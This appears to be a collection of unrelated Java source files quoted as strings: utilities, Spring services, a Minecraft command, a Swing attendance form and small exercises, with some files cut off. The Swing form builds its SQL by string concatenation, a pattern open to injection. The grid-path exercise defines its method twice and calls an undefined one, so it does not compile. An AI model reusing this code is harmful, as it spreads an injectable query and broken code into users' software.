    "package com.campusdual.util;\n\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.text.DecimalFormat;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Random;\n\npublic class Utils {\n\n    private Utils(){}\n\n    public static final Random random = new Random();\n    public static final DecimalFormat dF = new DecimalFormat(\"#.##\");\n\n    /**\n     * Method to initialize input data.\n     * @return input Buffered string data.\n     */\n    public static String init() {\n        String buffer = \"\";\n        InputStreamReader stream = new InputStreamReader(System.in);\n        BufferedReader reader = new BufferedReader(stream);\n        try {\n            buffer = reader.readLine();\n        } catch (Exception e) {\n            System.out.append(\"Dato no v\u00e1lido.\");\n        }\n        return buffer;\n    }\n\n    /**\n     * Method to get an integer from input data.\n     * @return integer entered by the user.\n     */\n    public static int integer() {\n        return Utils.integer(null);\n    }\n\n    /**\n     * Method to get an integer from input data with a custom message.\n     * @param message custom message for the user.\n     * @return integer entered by the user.\n     */\n    public static int integer(String message) {\n        if (message != null) {\n            System.out.print(message);\n        }\n\n        try{\n            return Integer.parseInt(Utils.init());\n        } catch (NumberFormatException e){\n            System.out.println(\"El valor no es un n\u00famero entero.\");\n            return integer(message);\n        }\n    }\n\n\n    /**\n     * Method to get a real number from input data.\n     * @return real number entered by the user.\n     */\n    public static double real() {\n        return Utils.real(null);\n    }\n\n    /**\n     * Method to get a real number from input data with a custom message.\n     * @param message custom message for the user.\n     * @return real number entered by the user.\n     */\n    public static double real(String message) {\n        if (message != null) {\n            System.out.print(message);\n        }\n        try{\n\n            return Double.parseDouble(Utils.init());\n        } catch (NumberFormatException e){\n            System.out.println(\"El valor no es un n\u00famero real.\");\n            return real(message);\n        }\n    }\n\n    /**\n     * Method to get a text string from input data.\n     * @return text string entered by the user.\n     */\n    public static String string() {\n        return Utils.string(null);\n    }\n\n\n    /**\n     * Method to get a text string from input data with a custom message.\n     * @param message custom message for the user.\n     * @return text string entered by the user.\n     */\n    public static String string(String message) {\n        if (message != null) {\n            System.out.print(message);\n        }\n        return Utils.init();\n    }\n\n    /**\n     * Method to get a character from input data.\n     * @return character entered by the user.\n     */\n    public static char character() {\n        return Utils.character(null);\n    }\n\n    /**\n     * Method to get a character from input data with a custom message.\n     * @param message custom message for the user.\n     * @return character entered by the user.\n     */\n    public static char character(String message) {\n        if (message != null) {\n            System.out.print(message);\n        }\n        String valor = Utils.init();\n        return valor.charAt(0);\n    }\n\n    /**\n     * Formats the {@link Double} value passed as a parameter with the pattern #.##\n     *\n     * @param d\n     *            the value to be transformed\n     * @return The formatted double\n     */\n    public static String formatLocalNumber(double d) {\n        return dF.format(d);\n    }\n\n    /**\n     * Retrieves a random number selected from the values passed as parameters.\n     *\n     * @param min\n     *            The lower limit of the range\n     * @param max\n     *            The upper limit of the range\n     * @return A random number within the selected range.\n     */\n    public static int getRandomNumberInRange(int min, int max) {\n        max++;\n        return random.nextInt(max - min) + min;\n    }\n\n    /**\n     * Displays a list with indices and allows it to show a waiting message.\n     *\n     * @param list\n     *            The list to be displayed\n     * @param wait\n     *            <code>true</code> to wait after displaying the list,\n     *            <code>false</code> otherwise.\n     */\n    public static <T> void showFromList(List<T> list, boolean wait) {\n        Utils.showFromList(list, wait, null);\n    }\n\n    /**\n     * Displays a list with indices, allows showing a waiting message, and excludes\n     * the elements from the first list that are present in the second list.\n     *\n     * @param list\n     *            The list to be displayed\n     * @param wait\n     *            <code>true</code> to wait after displaying the list,\n     *            <code>false</code> otherwise.\n     * @param excludeElements\n     *      ",
    "package br.com.danluan.seuJob.model;\n\nimport jakarta.persistence.*;\nimport org.hibernate.annotations.CreationTimestamp;\n\nimport java.util.Date;\n\n@Entity\n@Table(name = \"tb_application\")\npublic class Application {\n\n    @Id\n    @GeneratedValue(strategy = GenerationType.IDENTITY)\n    private Integer id;\n\n    @ManyToOne(fetch = FetchType.LAZY)\n    @JoinColumn(name = \"job_id\")\n    private Job job;\n\n    @ManyToOne(fetch = FetchType.LAZY)\n    @JoinColumn(name = \"user_id\")\n    private User user;\n\n    @Column()\n    private String status;\n\n    @CreationTimestamp\n    @Temporal(TemporalType.TIMESTAMP)\n    @Column(name = \"apply_date\", updatable = false)\n    private Date applyDate;\n\n    public Application() {\n    }\n\n    public Application(Job job, User user) {\n        this.job = job;\n        this.user = user;\n        this.status = status;\n    }\n\n\n    public Job getJob() {\n        return job;\n    }\n\n    public void setJob(Job job) {\n        this.job = job;\n    }\n\n    public User getUser() {\n        return user;\n    }\n\n    public void setUser(User user) {\n        this.user = user;\n    }\n\n    public String getStatus() {\n        return status;\n    }\n\n    public void setStatus(String status) {\n        this.status = status;\n    }\n}\n",
    "/*\nProblem Statement:\nA Rover sent to moon wants to move in a research area land in form grid of size M x N. (M- Rows N- Columns). Rover starts from (0,0) coordinates and it has to reach to destination (M-1,N-1) coordinates. \nNote: Rover can only move right or down. \nYou have to compute the total number of ways rover can reach the destination.\nComplete the function RoverWalk with parameters:\ninteger M,N : It specifies the the Number of rows and columns in the area grid.\n\nFunction returns:\ninteger: the count of number of possible ways for rover to reach (0,0) to (M-1,N-1) destination coordinates.\nNote: Both M and N may be equal or not (i.e grid can be square as well as rectangular in shape\n\nConstraints to be followed:\n1 <= M,N <=500\nSample testcase 1:\nInput:\n2 2\nOutput:\n2\nSample testcase 2:\nInput:\n5 5\nOutput:\n70\n*/\n\nimport java.util.*;\npublic class Main {\n    \n    //DP Approach\n    public static int countWays(int M, int N) {\n        int[][] dp = new int[M][N];\n        \n        for (int i = 0; i < M; i++)\n            dp[i][0] = 1;\n        for (int j = 0; j < N; j++)\n            dp[0][j] = 1;\n        \n        for (int i = 1; i < M; i++) {\n            for (int j = 1; j < N; j++) {\n                dp[i][j] = dp[i - 1][j] + dp[i][j - 1];\n            }\n        }\n        return dp[M - 1][N - 1];\n    }\n\n    // Recursive Approach\n    public static int countWays(int M, int N)\n    {\n        if(M == 1 || N == 1)\n        return 1;\n        \n        return CountWays(M-1, N) + CountWays(M, N-1);\n    }\n\n    public static void main(String[] args) {\n        Scanner sc = new Scanner(System.in);\n        int M = sc.nextInt();\n        int N = sc.nextInt();\n        System.out.println(countWays(M, N));\n    }\n}\n\n",
    "package org.randomtp.rtp.command;\r\n\r\nimport org.bukkit.*;\r\nimport org.bukkit.command.Command;\r\nimport org.bukkit.command.CommandSender;\r\nimport org.bukkit.entity.Player;\r\nimport org.jetbrains.annotations.NotNull;\r\n\r\nimport java.util.List;\r\nimport java.util.Random;\r\n\r\npublic class RandomTeleportCommand extends Command{\r\n\r\n    public RandomTeleportCommand(@NotNull String name, @NotNull String description, @NotNull String usageMessage, @NotNull List<String> aliases) {\r\n        super(name, description, usageMessage, aliases);\r\n    }\r\n\r\n    @Override\r\n    public boolean execute(@NotNull CommandSender commandSender, @NotNull String s, @NotNull String[] strings) {\r\n        if (commandSender instanceof Player) {\r\n            Player player = (Player) commandSender;\r\n            player.sendTitle(\"\u00a77Location search\", null);\r\n            \r\n            Random random = new Random();\r\n            int x = random.nextInt(1000) - 500;\r\n            int y = 60;\r\n            int z = random.nextInt(1000) - 500;\r\n\r\n            World world = player.getWorld();\r\n            Chunk chunk = world.getChunkAt(x, z);\r\n            if (chunk.load()) {\r\n                Location targetLocation = new Location(world, x, y, z);\r\n                while (targetLocation.getBlock().getType() != Material.AIR) {\r\n                    targetLocation.setY(targetLocation.getY() + 1);\r\n                }\r\n\r\n                world.loadChunk(chunk);\r\n                player.sendTitle(\"\u00a7eLocation found\", null);\r\n                player.teleport(targetLocation);\r\n                return true;\r\n            }\r\n            player.sendMessage(\"\u00a7cError! Location was not found\");\r\n            return true;\r\n        }\r\n        commandSender.sendMessage(\"Use in game\");\r\n        return true;\r\n    }\r\n}",
    "package application;\n\nimport java.time.LocalDateTime;\nimport java.time.format.DateTimeFormatter;\nimport java.util.Locale;\nimport java.util.Scanner;\n\nimport model.entities.CarRental;\nimport model.entities.Vehicle;\nimport model.services.BrazilTaxService;\nimport model.services.RentalService;\n\npublic class Program {\n\n\tpublic static void main(String[] args) {\n\t\t\n\t\tLocale.setDefault(Locale.US);\n\t\tScanner sc = new Scanner(System.in);\n\t\t\n\t\tSystem.out.println(\"Entre com os dados do aluguel\");\n\t\tSystem.out.print(\"Modelo do carro: \");\n\t\tString carModel = sc.nextLine();\n\t\tSystem.out.print(\"Retirada (DD/MM/YYYY HH:MM): \");\n\t\tLocalDateTime start = LocalDateTime.parse(sc.nextLine(), DateTimeFormatter.ofPattern(\"dd/MM/yyyy HH:mm\"));\n\t\tSystem.out.print(\"Devolu\u00e7\u00e3o (DD/MM/YYYY HH:MM): \");\n\t\tLocalDateTime finish = LocalDateTime.parse(sc.nextLine(), DateTimeFormatter.ofPattern(\"dd/MM/yyyy HH:mm\"));\n\t\tSystem.out.print(\"Entre com o pre\u00e7o por hora: \");\n\t\tdouble pricePerHour = sc.nextDouble();\n\t\tSystem.out.print(\"Entre com o pre\u00e7o por dia: \");\n\t\tdouble pricePerDay = sc.nextDouble();\n\t\t\n\t\tCarRental carRental = new CarRental(start, finish, new Vehicle(carModel));\n\t\tRentalService rentalService = new RentalService(pricePerHour, pricePerDay, new BrazilTaxService());\n\t\trentalService.processInvoice(carRental);\n\t\t\n\t\tSystem.out.println(\"FATURA\");\n\t\tSystem.out.println(\"Pagamento b\u00e1sico: \" + String.format(\"%.2f\", carRental.getInvoice().getBasicPayment()));\n\t\tSystem.out.println(\"Imposto: \" + String.format(\"%.2f\", carRental.getInvoice().getTax()));\n\t\tSystem.out.println(\"Pagamento total: \" + String.format(\"%.2f\", carRental.getInvoice().getTotalPayment()));\n\t\n\t\tsc.close();\n\t\t\n\t}\n\n}\n",
    "package org.example;\n\nimport java.util.ArrayList;\nimport java.util.Iterator;\nimport java.util.List;\n\n//\u0423\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0438\u0435 \u0431\u043b\u043e\u043a\u0430\u043c\u0438. \u041b\u043e\u0433\u0438\u0447\u043d\u043e\npublic class BlockManager {\n    private List<Block> blockList; // \u0421\u043f\u0438\u0441\u043e\u043a \u0434\u043b\u044f \u0443\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0438\u044f \u0431\u043b\u043e\u043a\u0430\u043c\u0438\n\n    Physics physics = new Physics();\n    public BlockManager(){\n        this.blockList = new ArrayList<>(); // \u0418\u043d\u0438\u0446\u0438\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u044f \u043f\u0443\u0441\u0442\u043e\u0433\u043e \u0441\u043f\u0438\u0441\u043a\u0430 \u0431\u043b\u043e\u043a\u043e\u0432\n\n    }\n    public void addBlockForLevel(int LVL, int quantity){\n        List<Block> newBlocks = Factorys.BlockFactory.createBlocksByLVL(LVL, quantity);\n        this.blockList.addAll(newBlocks); // \u0414\u043e\u0431\u0430\u0432\u043b\u0435\u043d\u0438\u0435 \u043d\u043e\u0432\u044b\u0445 \u0431\u043b\u043e\u043a\u043e\u0432 \u0432 \u0441\u043f\u0438\u0441\u043e\u043a\n    }\n    public void update(Ball ball) {\n        //Blocks Iterator for safety deleting\n        Iterator<Block> blockIterator = blockList.iterator();\n        while (blockIterator.hasNext()) {\n            Block block = blockIterator.next();\n            //Check collision Physics\n            if (physics.checkCollision(ball, block)){\n                System.out.println(\"UPDATE Collision is true\");\n\n                physics.ReactOnCollision(ball, block);\n                blockIterator.remove();\n                break;\n            }\n\n        }\n\n    }\n\n\n    public void render(){\n        for(Block block:blockList){\n            //   block.update();\n            block.render();\n        }\n    }\n}\n",
    "package org.example.entity.vo;\n\nimport lombok.Data;\nimport org.example.cache.GlobalCache;\n\nimport java.util.concurrent.Delayed;\nimport java.util.concurrent.TimeUnit;\n\n/**\n * Created by cld on 2024/4/1 9:51\n */\n@Data\npublic class OderDelayed implements Delayed {\n\n    /**\n     * \u6d4b\u8bd5\u5ef6\u8fdf\u961f\u5217\n     * @param args\n     * @throws InterruptedException\n     */\n    public static void main(String[] args) throws InterruptedException {\n        OderDelayed oderDelayed = new OderDelayed(1L, 1L, 1L, System.currentTimeMillis() + 5 * 1000);\n        OderDelayed oderDelayed2 = new OderDelayed(2L, 1L, 1L, System.currentTimeMillis() + 3 * 1000);\n        GlobalCache.oderDelayedDelayQueue.offer(oderDelayed);\n        GlobalCache.oderDelayedDelayQueue.offer(oderDelayed2);\n        while (true)\n        {\n            long timeMillis = System.currentTimeMillis();\n            OderDelayed take = GlobalCache.oderDelayedDelayQueue.take();\n            System.out.println(take.getOrderId());\n            System.out.println(System.currentTimeMillis() - timeMillis);\n        }\n    }\n\n    private Long orderId;\n    private Long userId;\n    private Long goodsId;\n    private Long inTime;\n    private long time;\n\n    public OderDelayed(Long orderId, Long userId, Long goodsId, Long inTime, long time) {\n        this.orderId = orderId;\n        this.userId = userId;\n        this.goodsId = goodsId;\n        this.inTime = inTime;\n        this.time = time;\n    }\n\n    public OderDelayed(Long orderId, Long userId, Long goodsId, long time) {\n        this.orderId = orderId;\n        this.userId = userId;\n        this.goodsId = goodsId;\n        this.time = time;\n    }\n\n    @Override\n    public long getDelay(TimeUnit unit) {\n        return time - System.currentTimeMillis();\n    }\n\n    @Override\n    public int compareTo(Delayed o) {\n        OderDelayed oderDelayed = (OderDelayed) o;\n        long to = this.time - oderDelayed.getTime();\n        return to <= 0 ? -1 : 1;\n    }\n}\n",
    "/*\r\n * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license\r\n * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template\r\n */\r\npackage attendence.management.system;\r\nimport javax.swing.*;\r\nimport java.awt.*;\r\nimport java.sql.*;\r\nimport com.toedter.calendar.JDateChooser;\r\nimport java.awt.event.*;\r\n\r\npublic class StudentLeave extends JFrame implements ActionListener {\r\n\r\n    Choice crollno, ctime;\r\n    JDateChooser dcdate;\r\n    JButton submit, cancel;\r\n    \r\n    StudentLeave() {\r\n        \r\n        setSize(550, 650);\r\n        setLocation(550, 100);\r\n        setLayout(null);\r\n        \r\n        getContentPane().setBackground(Color.WHITE);\r\n        \r\n        JLabel heading = new JLabel(\"Apply LEAVE/EXEMPTION (Student)\");\r\n        heading.setBounds(40, 50, 510, 30);\r\n        heading.setFont(new Font(\"Tahoma\", Font.BOLD, 26));\r\n        add(heading);\r\n        \r\n        JLabel lblrollno = new JLabel(\"Search by Roll Number\");\r\n        lblrollno.setBounds(60, 120, 200, 20);\r\n        lblrollno.setFont(new Font(\"Tahoma\", Font.PLAIN, 18));\r\n        add(lblrollno);\r\n        \r\n        crollno = new Choice();\r\n        crollno.setBounds(60, 150, 200, 20);\r\n        add(crollno);\r\n        \r\n        try {\r\n            Conn c = new Conn();\r\n            ResultSet rs = c.s.executeQuery(\"select * from student\");\r\n            while(rs.next()) {\r\n                crollno.add(rs.getString(\"rollno\"));\r\n            }\r\n        } catch (Exception e) {\r\n            e.printStackTrace();\r\n        }\r\n        \r\n        JLabel lbldate = new JLabel(\"Date\");\r\n        lbldate.setBounds(60, 190, 200, 20);\r\n        lbldate.setFont(new Font(\"Tahoma\", Font.PLAIN, 18));\r\n        add(lbldate);\r\n        \r\n        dcdate = new JDateChooser();\r\n        dcdate.setBounds(60, 230, 200, 25);\r\n        add(dcdate);\r\n        \r\n        JLabel lbltime = new JLabel(\"Time Duration\");\r\n        lbltime.setBounds(60, 270, 200, 20);\r\n        lbltime.setFont(new Font(\"Tahoma\", Font.PLAIN, 18));\r\n        add(lbltime);\r\n        \r\n        ctime = new Choice();\r\n        ctime.setBounds(60, 320, 200, 20);\r\n        ctime.add(\"Full Day\");\r\n        ctime.add(\"Half Day\");\r\n        add(ctime);\r\n        \r\n        submit = new JButton(\"Submit\");\r\n        submit.setBounds(60, 450, 160, 40);\r\n        submit.setBackground(Color.BLACK);\r\n        submit.setForeground(Color.WHITE);\r\n        submit.addActionListener(this);\r\n        submit.setFont(new Font(\"Tahoma\", Font.BOLD, 15));\r\n        add(submit);\r\n        \r\n        cancel = new JButton(\"Cancel\");\r\n        cancel.setBounds(270, 450, 160, 40);\r\n        cancel.setBackground(Color.BLACK);\r\n        cancel.setForeground(Color.WHITE);\r\n        cancel.addActionListener(this);\r\n        cancel.setFont(new Font(\"Tahoma\", Font.BOLD, 15));\r\n        add(cancel);\r\n        \r\n        setVisible(true);\r\n    }\r\n    \r\n    public void actionPerformed(ActionEvent ae) {\r\n        if (ae.getSource() == submit) {\r\n            String rollno = crollno.getSelectedItem();\r\n            String date = ((JTextField) dcdate.getDateEditor().getUiComponent()).getText();\r\n            String duration = ctime.getSelectedItem();\r\n            \r\n            String query = \"insert into studentleave values('\"+rollno+\"', '\"+date+\"', '\"+duration+\"')\";\r\n            \r\n            try {\r\n                Conn c = new Conn();\r\n                c.s.executeUpdate(query);\r\n                JOptionPane.showMessageDialog(null, \"Leave Confirmed\");\r\n                setVisible(false);\r\n            } catch (Exception e) {\r\n                e.printStackTrace();\r\n            }\r\n        } else {\r\n            setVisible(false);\r\n        }\r\n    }\r\n\r\n    public static void main(String[] args) {\r\n        new StudentLeave();\r\n    }\r\n}",
    "package com.example.oz.springbootapi.repository;\r\n\r\nimport com.example.oz.springbootapi.domain.Tour;\r\nimport org.springframework.data.domain.Page;\r\nimport org.springframework.data.domain.Pageable;\r\nimport org.springframework.data.repository.CrudRepository;\r\nimport org.springframework.data.repository.PagingAndSortingRepository;\r\nimport org.springframework.data.repository.query.Param;\r\n\r\nimport java.util.Optional;\r\n\r\n/**\r\n * Repository for managing tours.\r\n */\r\npublic interface TourRepository extends CrudRepository<Tour, Integer>, PagingAndSortingRepository<Tour, Integer> {\r\n\r\n\r\n    // Older versions of spring require this @Param annotation\r\n\r\n    /**\r\n     * Returns a list of tours associated with a specific tour package code.\r\n     * @param code the tour package code\r\n     * @param pageable the pagination options\r\n     * @return a paged collection of matching tours\r\n     */\r\n    Page<Tour> findByTourPackageCode(@Param(\"code\")String code, Pageable pageable);\r\n\r\n    /**\r\n     * Look for a tour based on its title.\r\n     * @param title the title to look for\r\n     * @return Optional of a matching Tour\r\n     */\r\n    Optional<Tour> findByTitle(String title);\r\n}\r\n",
    "/**\n * (C) Copyright 2021 Araf Karsh Hamid\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *   http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\npackage io.fusion.air.microservice.adapters.controllers.secured;\n\n\nimport io.fusion.air.microservice.domain.models.core.StandardResponse;\nimport io.fusion.air.microservice.domain.models.example.PaymentDetails;\nimport io.fusion.air.microservice.domain.models.example.PaymentStatus;\nimport io.fusion.air.microservice.domain.models.example.PaymentType;\n\nimport io.fusion.air.microservice.server.config.ServiceConfiguration;\nimport io.fusion.air.microservice.server.controllers.AbstractController;\nimport io.swagger.v3.oas.annotations.Operation;\nimport io.swagger.v3.oas.annotations.media.Content;\nimport io.swagger.v3.oas.annotations.responses.ApiResponse;\nimport io.swagger.v3.oas.annotations.responses.ApiResponses;\nimport io.swagger.v3.oas.annotations.security.SecurityRequirement;\nimport io.swagger.v3.oas.annotations.tags.Tag;\nimport jakarta.validation.Valid;\nimport org.slf4j.Logger;\n\nimport org.springframework.http.HttpHeaders;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.http.HttpStatus;\nimport org.springframework.http.ResponseEntity;\nimport org.springframework.web.bind.annotation.*;\nimport org.springframework.web.context.annotation.RequestScope;\n\nimport jakarta.servlet.http.HttpServletRequest;\nimport java.time.LocalDateTime;\nimport java.util.HashMap;\nimport java.util.UUID;\n\nimport static java.lang.invoke.MethodHandles.lookup;\nimport static org.slf4j.LoggerFactory.getLogger;\n\n/**\n * Payment Controller (Secured) for the Service\n *\n * All the calls in this package will be secured with JWT Token.\n * \n * @author arafkarsh\n * @version 1.0\n * \n */\n@CrossOrigin\n@Configuration\n@RestController\n// \"/ms-cache/api/v1\"\n@RequestMapping(\"${service.api.path}/payment\")\n@RequestScope\n@Tag(name = \"Secured Payments API\", description = \"Ex. io.f.a.m.adapters.controllers.secured.PaymentControllerImpl\")\npublic class PaymentControllerImpl extends AbstractController {\n\n\t// Set Logger -> Lookup will automatically determine the class name.\n\tprivate static final Logger log = getLogger(lookup().lookupClass());\n\t\n\t@Autowired\n\tprivate ServiceConfiguration serviceConfig;\n\tprivate String serviceName;\n\n\t/**\n\t * Get Method Call to Check the Health of the App\n\t * \n\t * @return\n\t */\n    @Operation(summary = \"Check the Payment status\", security = { @SecurityRequirement(name = \"bearer-key\") })\n\t@ApiResponses(value = {\n            @ApiResponse(responseCode = \"200\",\n            description = \"Payment Status Check\",\n            content = {@Content(mediaType = \"application/json\")}),\n            @ApiResponse(responseCode = \"404\",\n            description = \"Invalid Payment Reference No.\",\n            content = @Content)\n    })\n\t@GetMapping(\"/status/{referenceNo}\")\n\t@ResponseBody\n\tpublic ResponseEntity<StandardResponse> getStatus(@PathVariable(\"referenceNo\") String _referenceNo,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\tHttpServletRequest request) throws Exception {\n\t\tlog.debug(\"|\"+name()+\"|Request to Payment Status of Service... \");\n\t\tStandardResponse stdResponse = createSuccessResponse(\"Processing Success!\");\n\t\t// Response Object\n\t\tHashMap<String,Object> status = new HashMap<String,Object>();\n\t\tstatus.put(\"ReferenceNo\", _referenceNo);\n\t\tstatus.put(\"Message\",\"Payment Status is good!\");\n\t\tstdResponse.setPayload(status);\n\t\t// Additional Headers\n\t\t// HttpHeaders headers = new HttpHeaders();\n\t\t// headers.add(HttpHeaders.CACHE_CONTROL, \"no-cache\");\n\t\t// Return the Response\n\t\treturn new ResponseEntity<StandardResponse>(stdResponse, HttpStatus.OK);\n\t}\n\n\t/**\n\t * Process the Payments\n\t */\n    @Operation(summary = \"Process Payments\", security = { @SecurityRequirement(name = \"bearer-key\") })\n    @ApiResponses(value = {\n            @ApiResponse(responseCode = \"200\",\n            description = \"Process the payment\",\n            content = {@Content(mediaType = \"application/json\")}),\n            @ApiResponse(responseCode = \"404\",\n            description = \"Unable to process the payment\",\n            content = @Content)\n    })\n    @PostMapping(\"/processPayments\")\n    public ResponseEntity<StandardResponse> processPayments(@Valid @RequestBody PaymentDetails _payDetails) {\n\t\tlog.debug(\"|\"+name()+\"|Request to process payments... \");\n\t\tStandardResponse stdResponse = createSuccessResponse(\"Processing Success!\");\n\t\tPaymentStatus ps = new PaymentStatus(\n\t\t\t\t\"fb908151-d249-4d30-a6a1-4705729394f4\",\n\t\t\t\tLocalDateTime.n",
    "package application;\n\nimport java.text.ParseException;\nimport java.text.SimpleDateFormat;\nimport java.util.Date;\n//import java.util.HashMap;\nimport java.util.Locale;\n//import java.util.Map;\nimport java.util.Scanner;\n\nimport entities.Client;\nimport entities.Order;\nimport entities.OrderItem;\nimport entities.Product;\nimport entities.enums.OrderStatus;\n\npublic class Program {\n\n\tpublic static void main(String[] args) throws ParseException {\n\t\t\n\t\tLocale.setDefault(Locale.US);\n\t\tScanner sc = new Scanner(System.in);\n\t\tSimpleDateFormat sdf = new SimpleDateFormat(\"dd/MM/yyyy\");\n\t\t\n\t\t//Map<Integer, OrderStatus> oderStatus = new HashMap<>();\n\t\t\n\t\tSystem.out.println(\"Enter client data: \");\n\t\tSystem.out.print(\"Name: \");\n\t\tString name = sc.nextLine();\n\t\tSystem.out.print(\"Email: \");\n\t\tString email = sc.nextLine();\n\t\tSystem.out.print(\"Birth Date: (DD/MM/YYYY): \");\n\t\tDate birthDate = sdf.parse(sc.next());\n\t\t\n\t\tClient client = new Client(name, email, birthDate);\n\t\t\n\t\tSystem.out.println(\"Enter order data: \");\n\t\tSystem.out.print(\"Choose the status: 0-Pending payment | 1-Processing | 2-Shipped | 3-Delivered: \");\n\t\tint statusNumber = sc.nextInt();\n\t\t\n\t\t//OrderStatus status = OrderStatusConverter.convertIntToOrderStatus(statusNumber);\n\t\tOrderStatus status = OrderStatus.valueOf(statusNumber);\n\t\t\n\t\tOrder order = new Order(new Date(), status, client);\n\t\t\n\t\tSystem.out.print(\"How many items to this order? \");\n\t\tint n = sc.nextInt();\n\t\tfor(int i=1; i<=n; i++){\n\t\t\tSystem.out.println(\"Enter #\" + i + \" item data:\");\n\t\t\tSystem.out.print(\"Product name: \");\n\t\t\tsc.nextLine();\n\t\t\tString productName = sc.nextLine();\n\t\t\tSystem.out.print(\"Product price: \");\n\t\t\tdouble productPrice = sc.nextDouble();\n\t\t\t\n\t\t\tProduct product = new Product(productName, productPrice);\n\t\t\t\n\t\t\tSystem.out.print(\"Quantity: \");\n\t\t\tint quantity = sc.nextInt();\n\t\t\t\n\t\t\tOrderItem orderItem = new OrderItem(quantity, productPrice, product);\n\t\t\t\n\t\t\torder.addItem(orderItem);\n\t\t}\n\t\t\n\t\tSystem.out.println();\n\t\tSystem.out.println(\"Order summary: \");\n\t\tSystem.out.println(order);\n\t\t\n\t\tsc.close();\n\t}\n\t\n\t/*public static class OrderStatusConverter {\n\t    public static OrderStatus convertIntToOrderStatus(int number) {\n\t        switch (number) {\n\t            case 0:\n\t                return OrderStatus.PENDING_PAYMENT;\n\t            case 1:\n\t                return OrderStatus.PROCESSING;\n\t            case 2:\n\t                return OrderStatus.SHIPPED;\n\t            case 3:\n\t                return OrderStatus.DELIVERED;\n\t            default:\n\t                throw new IllegalArgumentException(\"N\u00famero de status de pedido inv\u00e1lido: \" + number);\n\t        }\n\t    }\n}*/\n}\n",
    "package com.example.jpa_example.service.segment;\n\nimport com.example.jpa_example.constant.ResponseConstant;\nimport com.example.jpa_example.dto.GlobalResponseDTO;\nimport com.example.jpa_example.dto.request.SegmentRequestDTO;\nimport com.example.jpa_example.dto.request.TenureRequestDTO;\nimport com.example.jpa_example.dto.response.SegmentResponseDTO;\nimport com.example.jpa_example.entity.SegmentEntity;\nimport com.example.jpa_example.entity.TenureEntity;\nimport com.example.jpa_example.repository.ISegmentRepository;\nimport com.example.jpa_example.repository.ITenureRepository;\nimport com.example.jpa_example.service.base.BaseServiceAPICRUD;\nimport org.springframework.http.HttpStatus;\nimport org.springframework.stereotype.Service;\n\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Optional;\n\n@Service\npublic class SegmentServiceCRUD implements BaseServiceAPICRUD<SegmentRequestDTO, SegmentResponseDTO> {\n    final ISegmentRepository segmentRepository;\n    final ITenureRepository tenureRepository;\n\n    public SegmentServiceCRUD(ISegmentRepository segmentRepository, ITenureRepository tenureRepository) {\n        this.segmentRepository = segmentRepository;\n        this.tenureRepository = tenureRepository;\n    }\n\n    @Override\n    public GlobalResponseDTO<List<SegmentResponseDTO>> getAll() {\n        try{\n            List<SegmentEntity> segmentEntities = this.segmentRepository.findAll();\n\n            List<SegmentResponseDTO> segmentInsertResponseDTOS = new ArrayList<>();\n\n            for (SegmentEntity segmentEntity : segmentEntities){\n                List<TenureEntity> tenureEntities = this.tenureRepository.findBySegment(segmentEntity);\n                segmentInsertResponseDTOS.add(SegmentResponseDTO.setSegmentEntityToSegmentResponse(segmentEntity, tenureEntities));\n            }\n\n            return new GlobalResponseDTO<>(HttpStatus.OK.value(), true, ResponseConstant.SUCCESS, segmentInsertResponseDTOS);\n        }catch (Exception e){\n            return new GlobalResponseDTO<>(HttpStatus.INTERNAL_SERVER_ERROR.value(), false, e.getLocalizedMessage(), null);\n        }\n    }\n\n    @Override\n    public GlobalResponseDTO<SegmentResponseDTO> save(SegmentRequestDTO segmentRequestDTO) {\n        try{\n            SegmentEntity segment = new SegmentEntity();\n\n            Optional<SegmentEntity> segmentEntity = this.segmentRepository.findById(segmentRequestDTO.getSegmentId());\n\n            if (segmentEntity.isPresent()) {\n                segment = segmentEntity.get();\n            }else{\n                segment.setSegmentId(segmentRequestDTO.getSegmentId());\n            }\n\n            segment.setSegmentName(segmentRequestDTO.getSegmentName());\n            segment.setApplicationType(segmentRequestDTO.getApplicationType());\n            segment.setChannelCode(segmentRequestDTO.getChannelCode());\n\n            SegmentEntity savedSegment = this.segmentRepository.saveAndFlush(segment);\n            segment.setSegmentId(savedSegment.getSegmentId());\n\n            List<TenureEntity> tenureEntities = new ArrayList<>();\n\n            for (TenureRequestDTO tenureRequestDTO : segmentRequestDTO.getTenureEntities()){\n                TenureEntity tenure = new TenureEntity();\n\n                Optional<TenureEntity> tenureEntity = this.tenureRepository.findById(tenureRequestDTO.getTenureId());\n\n                if (tenureEntity.isPresent()){\n                    tenure = tenureEntity.get();\n                }\n\n                tenure.setTenureId(tenureRequestDTO.getTenureId());\n                tenure.setMsc(tenureRequestDTO.getMsc());\n                tenure.setTenore(tenureRequestDTO.getTenore());\n                tenure.setInsuranceFee(tenureRequestDTO.getInsuranceFee());\n                tenure.setAdminFee(tenureRequestDTO.getAdminFee());\n                tenure.setSegment(savedSegment);\n\n                TenureEntity saveTenure = this.tenureRepository.saveAndFlush(tenure);\n                tenureEntities.add(saveTenure);\n            }\n            return new GlobalResponseDTO<>(HttpStatus.OK.value(), true, ResponseConstant.SUCCESS, SegmentResponseDTO.setSegmentEntityToSegmentResponse(segment, tenureEntities));\n        }catch (Exception e){\n            return new GlobalResponseDTO<>(HttpStatus.INTERNAL_SERVER_ERROR.value(), false, e.getLocalizedMessage(), null);\n        }\n    }\n}\n",
